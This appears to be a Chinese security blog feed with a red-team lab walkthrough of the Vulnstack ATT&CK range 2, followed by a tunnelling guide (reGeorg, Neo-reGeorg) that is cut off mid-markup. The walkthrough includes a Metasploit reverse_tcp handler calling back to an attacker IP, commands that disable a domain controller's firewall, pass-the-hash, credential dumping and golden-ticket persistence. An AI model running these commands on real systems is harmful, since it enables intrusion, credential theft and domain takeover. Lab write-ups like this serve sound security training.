    <published>2021-10-27T07:23:41.000Z</published>
    <updated>2022-03-26T08:00:08.970Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ATT-amp-CK红队评估实战靶场（二）"><a href="#ATT-amp-CK红队评估实战靶场（二）" class="headerlink" title="ATT&amp;CK红队评估实战靶场（二）"></a>ATT&amp;CK红队评估实战靶场（二）</h2><h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>继续内网基础学习，本篇文章为红日靶场系列的第二个靶场，主要涉及Access Token利用、WMI利用、域漏洞利用SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据&#x2F;白银票据&#x2F;Sid History&#x2F;MOF等攻防技术。</p><p>靶机下载地址如下：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;2&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h3><pre class="line-numbers language-none"><code class="language-none">web：外网ip - 192.168.1.80内网ip - 10.10.10.80PC：外网ip - 192.168.1.201内网ip - 10.10.10.201DC：内网ip - 10.10.10.10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：WEB服务器需要以管理员身份手动开启服务,在<code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code>下运行批处理程序<code>startWeblogic</code>即可启动weblogic</p><h3 id="0x03-漏洞发现及利用"><a href="#0x03-漏洞发现及利用" class="headerlink" title="0x03 漏洞发现及利用"></a>0x03 漏洞发现及利用</h3><h4 id="3-1-信息收集"><a href="#3-1-信息收集" class="headerlink" title="3.1. 信息收集"></a>3.1. 信息收集</h4><p>首先使用nmap扫描一下目标开放了哪些端口</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220325122526703.png"></p><p>我们可以看到目标开放了一些我们常见的端口，如：80，1433，7001，3389</p><p>访问80端口</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220325122738435.png"></p><p>访问7001端口</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220325122805186.png"></p><p>这里访问一下weblogic所在的7001端口，注意这里直接访问7001端口会显示404，这里直接访问<code>192.168.1.80:7001/console</code>即可</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220325211859585.png"></p><p>首先尝试一下控制台弱口令，失败</p><p>网上有相关的weblogic漏洞检测工具，我们可以拿来试一试，检测一下目标有没有漏洞。</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220325184945195.png"></p><p> 可以看到目标存在反序列化漏洞</p><p>这里我是用<code>CVE-2017-10271</code>进行命令执行发现为administrator权限</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220325185214827.png"></p><p>查看ip情况为双网卡，初步判断有域环境</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220325185401213.png"></p><p><code>tasklist /svc</code>查看一下进程发现了360主动防御，那么后面的马就需要做免杀处理</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220325185509420.png"></p><p>这里直接使用漏扫工具中自带的jsp马先上传进行尝试</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220325185755741.png"></p><p>访问一下能够访问到，那么已经上传成功</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220325190017623.png"></p><p>使用蚁剑进行连接</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220325190312430.png"></p><p>这里是测试显示是连接成功，但是当使用虚拟终端进行命令执行的时候失败了，可能这里是因为目标上存在360</p><p>的原因</p><p>上传一个冰蝎的马上去试试</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220325201414255.png"></p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220325201447146.png"></p><p>初步进行一下信息搜集，发现DNS为de1ay.com，这个应该就是域的名称</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220325202446483.png"></p><p>以下是在CMD中信息收集常用到的一下命令，这里不在一一演示</p><pre class="line-numbers language-none"><code class="language-none">&gt;whoami &#x2F;user 查看当前用户SID&gt;net config Workstation 查看当前计算机信息错误5：存在域，当前不是域用户显示时间: 存在域，当前是域内用户找不到域：不存在域&gt;net view &#x2F;domain 列出域列表&gt;net group &quot;Domain Controllers&quot; &#x2F;domain 查看主域控&gt;nltest &#x2F;DCLIST:zone.com 查看域控&gt;net group &quot;domain admins&quot; &#x2F;domain 查看域管理员&gt;net group &quot;enterprise admins&quot; domain 查看企业管理员列表&gt;net localgroup administrators &#x2F;domain 查看管理组用户&gt;net group &quot;domain computers&quot; &#x2F;domian 查看域成员计算机&gt;net accounts &#x2F;domain 查看密码策略&gt;net user &#x2F;domain 查看域内用户&gt;net view &#x2F;domain:dc 查询域内计算机&gt;netsh firewall set opmode disable&#x2F;enable 关闭windows防火强(win2003)&gt;netsh advfirewall set allprofiles state off&#x2F;on（大于win2003）&gt;arp -a 查看arp表&gt;net start 查看服务&gt;route print 查看路由表&gt;query user 查看登陆机器的用户的连接状态&gt;tasklist &#x2F;v 查看域管理员进程&gt;dsquery server查询域控制器&gt;dsquery computer 查询域内机器&gt;dsquery user 查询域用户&gt;dsquery ou 域内组织单位导出域DNS记录，文件保存在C:\Windows\System32\dns\&gt;dnscmd &#x2F;zoneexport zone.com 1.txt导出LDAP数据库&gt;LDIFDE -f c:\windows\temp\dump.ldf -n -m<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-2-上线msf"><a href="#3-2-上线msf" class="headerlink" title="3.2 上线msf"></a>3.2 上线msf</h4><p>这里首先生成一个msf的马,因为信息收集的时候发现发现目标主机上存在360，那么这里就需要进行免杀，不过免杀这一部分还不太熟悉，这里可能也是目标主机的360运行出错了，上传上马后，没有查杀</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220325205731503.png"></p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 192.168.1.5set lport 4444run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-3-内网渗透"><a href="#3-3-内网渗透" class="headerlink" title="3.3 内网渗透"></a>3.3 内网渗透</h4><p>socks代理扫描内网</p><p>这里首先添加一个10.10.10.0&#x2F;24段的路由，方便后续操作</p><pre class="line-numbers language-none"><code class="language-none">#添加一条路由run autoroute -s 10.10.10.0&#x2F;24#查看路由信息run get_local_subnets<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220326093613599.png"></p><p>使用socks4路由把msf带入内网，需要在proxychains.conf里面添加路由</p><pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;server&#x2F;socks_proxy set VERSION 4ashow optionsrun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220325211152712.png"></p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220325211311897.png"></p><p>这时候就可以使用msf中的<code>udp_probe</code>模块对10.10.10.0&#x2F;24段的主机进行信息搜集，这里发现10段还有另外两台主机，10.10.10.10和10.10.10.201</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220326091721022.png"></p><p>这里使用常规的nmap对这两个ip进行端口扫描发现什么都没有扫出来，那么这里应该是有防火墙的原因</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220326092135006.png"></p><p>使用ms17-010模块首先对内网进行扫描一下能不能够通过漏洞直接进行横向移动，注意因为有360的原因这里线程不要调的太高</p><pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010set rhost 10.10.10.0&#x2F;24set threads 5run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>扫描完成后发现两台主机都存在永恒之蓝漏洞</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220326094410015.png"></p><p>这里我们直接使用proxychains使msf走代理攻击到192.168.52.138，是无法获得meterpreter会话</p><h4 id="3-4-msf派生cs会话"><a href="#3-4-msf派生cs会话" class="headerlink" title="3.4 msf派生cs会话"></a>3.4 msf派生cs会话</h4><p>通过getuid查看了一下当前的权限发现只是一个user权限，也使用不了mimikatz，因为在cs上提权比较方便，这里就直接msf派生个对话给cs，在cs上进行提权操作</p><p>使用<code>payload-inject</code>把msf的对话派生给msf</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;payload_injectset PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_httpset DisablePayloadHandler trueset LHOST 192.168.1.5set LPORT 5555set SESSION 2run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220326101225528.png"></p><p>在CS开启一个监听器windows&#x2F;beacon_http&#x2F;reverse_http  host为<code>192.168.1.5</code>，port为5555</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220326101417379.png"></p><p>查看下内网ip的信息，dns为10.10.10.10，那么10.10.10.10大概率为域控</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220326101646869.png"></p><p>查看一下主机信息，证实了猜想</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220326101930975.png"></p><p>3.5 权限提升</p><p>这里因为是一个user权限首先要进行提权操作，使用<code>systeminfo</code>查看补丁情况发现只打了3个补丁，那么可以提权的exp有很多</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220326102051973.png"></p><p>这里使用<code>ms14-058</code>直接提权到system</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220326102937354.png"></p><p>使用<code>logonpasswords</code>导出密码</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220326103830698.png"></p><p>看到这里有一个SID为500的域管的帐号，那么直接可以用psexec进行hash传递横向移动</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220326103852799.png"></p><h3 id="0x4-横向移动"><a href="#0x4-横向移动" class="headerlink" title="0x4 横向移动"></a>0x4 横向移动</h3><p>这里首先扫描一下网段下的主机</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220326104252025.png"></p><p>和基本判断的一致，内网下有3台主机 </p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220326104929530.png"></p><p>这里使用80主机进行psexec操作</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220326110027250.png"></p><p>这里psexec执行了但是没有主机上线，这里想起来psexec是需要在防火墙关闭的情况下才能够进行pth的，所以这里尝试一下先ipc连接关闭防火墙后再进行psexec横向移动</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220326110055790.png"></p><p>使用ipc与10.10.10.10进行连接</p><pre class="line-numbers language-none"><code class="language-none">shell net use \\10.10.10.10\ipc$ 1qaz@WSX &#x2F;user:Administratorshell net use<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220326110157252.png"></p><p>使用sc创建计划任务立即执行关闭域控防火墙</p><pre class="line-numbers language-none"><code class="language-none">shell sc \\10.10.10.10 create unablefirewall binpath&#x3D; &quot;netsh advfirewall set allprofiles state off&quot;    shell sc \\10.10.10.10 start unablefirewall    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里关闭之后psexec还是没有成功，是因为这里DC只有内网ip，所以这里需要用到web进行中转操作才能够上线cs</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220326110405231.png"></p><p>这里我用到cs的smb beacon进行流量中转，首先建立监听一个smb beacon 再使用smb beacon进行psexec</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220326110804284.png"></p><p>即可上线DC</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220326143023388.png"></p><h3 id="0x5-权限维持"><a href="#0x5-权限维持" class="headerlink" title="0x5 权限维持"></a>0x5 权限维持</h3><p>这里使用到金票进行权限维持</p><p>首先<code>hashdump</code>出krbtgt的hash值</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220326143104618.png"></p><p>查看一下SID</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220326143220642.png"></p><p>在web主机上生成金票</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220326154528998.png"></p><p>可以看到这里dir域控c盘成功</p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220326154506656.png"></p><p><img src="/2021/10/27/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%BA%8C/image-20220326154601412.png"></p><h3 id="0x6-说明"><a href="#0x6-说明" class="headerlink" title="0x6 说明"></a>0x6 说明</h3><p>到这里，红日靶场二已经算是打完了，其中很多知识点还不算太清楚，对于权限维持这一部分具体的原理知识后续在慢慢学习。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ATT-amp-CK红队评估实战靶场（二）&quot;&gt;&lt;a href=&quot;#ATT-amp-CK红队评估实战靶场（二）&quot; class=&quot;headerlink&quot; title=&quot;ATT&amp;amp;CK红队评估实战靶场（二）&quot;&gt;&lt;/a&gt;ATT&amp;amp;CK红队评估实战靶场（二）&lt;/</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://hdys0vn.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透端口转发与代理工具总结</title>
    <link href="https://hdys0vn.github.io/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/"/>
    <id>https://hdys0vn.github.io/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/</id>
    <published>2021-10-21T12:45:42.000Z</published>
    <updated>2022-03-23T13:35:29.499Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>构建内网隐蔽通道，从而突破各种安全策略限制，实现对目标服务器的完美控制。<br>当我们从外网成功获得攻击点的时候，通过反弹shell、端口转发、内网穿透等技巧，来进一步入侵内网服务器。当我们取得内网目标服务器的控制权限，通过隧道技术绕过网络限制，实现隐蔽C2服务器的通信。</p><p>网络拓扑：</p><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323154340918.png"></p><p>网络配置IP如下：</p><pre class="line-numbers language-none"><code class="language-none">攻击机：win10：192.168.1.kali：192.168.1.5靶场：VM1：对外边界服务器，win7192.168.52.143192.168.1.9VM2：域成员，2003192.168.52.141VM3：域控，2008192.168.52.138<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x01-reGeorge-内网穿透"><a href="#0x01-reGeorge-内网穿透" class="headerlink" title="0x01 reGeorge 内网穿透"></a>0x01 reGeorge 内网穿透</h2><h3 id="1-1-环境"><a href="#1-1-环境" class="headerlink" title="1.1 环境"></a>1.1 环境</h3><p>攻击机kali<br>reGeorge软件，下载：<a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a><br>运行程序需要的环境：<br>Python、pip、urllib3；</p><h3 id="1-2-部署配置"><a href="#1-2-部署配置" class="headerlink" title="1.2 部署配置"></a>1.2 部署配置</h3><p>上传tunnel.nosocket.php<br>前提条件，已获得跳板机的权限，并且跳板机的server是php环境，将reGeorge中的tunnel.nosocket.php上传至网站</p><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323155438420.png"></p><p>并访问<a href="http://192.168.1.9/tunnel.nosocket.php">http://192.168.1.9/tunnel.nosocket.php</a><br>访问成功</p><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323155548224.png"></p><p>表示本地1080端口的流量都转发给指定的那个url，1080是指定的监听端口；</p><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323162728141.png"></p><p>配置代理<br>然后配置proxychains代理链的配置文件vim &#x2F;etc&#x2F;proxychains.conf，将代理设置成本机的1080端口：socks5 127.0.0.1 1080</p><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323163201935.png"></p><h3 id="1-3-测试"><a href="#1-3-测试" class="headerlink" title="1.3 测试"></a>1.3 测试</h3><p>命令前面加上proxychains 运行命令，测试下能否使用nmap扫描内网目标机win2008</p><pre class="line-numbers language-none"><code class="language-none">proxychains nmap -p22,80,3306 -n -sT -PN 192.168.52.138<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323164353406.png"></p><p>reGeorg控制端</p><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323164609249.png"></p><h2 id="0x02-Neo-reGeorg"><a href="#0x02-Neo-reGeorg" class="headerlink" title="0x02 Neo-reGeorg"></a>0x02 Neo-reGeorg</h2><h3 id="1-1-使用"><a href="#1-1-使用" class="headerlink" title="1.1 使用"></a>1.1 使用</h3><p>设置密码并生成隧道文件，运行后会生成一个neoreg_server目录，里面包含了各种语言类型的隧道文件</p><pre class="line-numbers language-none"><code class="language-none"># python3 neoreg.py generate -k 123456[+] Create neoreg server files:    &#x3D;&gt; neoreg_server&#x2F;key.txt.   # 密码    &#x3D;&gt; neoreg_server&#x2F;tunnel.nosocket.php    &#x3D;&gt; neoreg_server&#x2F;tunnel.js    &#x3D;&gt; neoreg_server&#x2F;tunnel.php    &#x3D;&gt; neoreg_server&#x2F;tunnel.ashx    &#x3D;&gt; neoreg_server&#x2F;tunnel.aspx    &#x3D;&gt; neoreg_server&#x2F;tunnel.tomcat.5.jsp    &#x3D;&gt; neoreg_server&#x2F;tunnel.tomcat.5.jspx    &#x3D;&gt; neoreg_server&#x2F;tunnel.jsp    &#x3D;&gt; neoreg_server&#x2F;tunnel.jspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323165313062.png"></p><h3 id="1-2-部署配置-1"><a href="#1-2-部署配置-1" class="headerlink" title="1.2 部署配置"></a>1.2 部署配置</h3><p>上传tunnel.php<br>前提条件，已获得跳板机的权限（都打到内网了，跳板机的权限肯定获得了），server-bt系统的跳板机是php环境，将reGeorge中的tunnel.php上传至网站</p><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323165438974.png"></p><p>并访问<a href="http://192.168.1.9/tunnel.php">http://192.168.1.9/tunnel.php</a><br>访问成功</p><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323165539584.png"></p><p>启动Neo-reGeorg</p><pre class="line-numbers language-none"><code class="language-none">python3 neoreg.py -k 123456 -u http:&#x2F;&#x2F;192.168.1.9&#x2F;tunnel.php#表示本地1080端口的流量都转发给指定的那个url，1080是指定的监听端口；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323165853324.png"></p><p>配置代理<br>然后配置proxychains代理链的配置文件vim &#x2F;etc&#x2F;proxychains.conf，将代理设置成本机的1080端口：</p><pre class="line-numbers 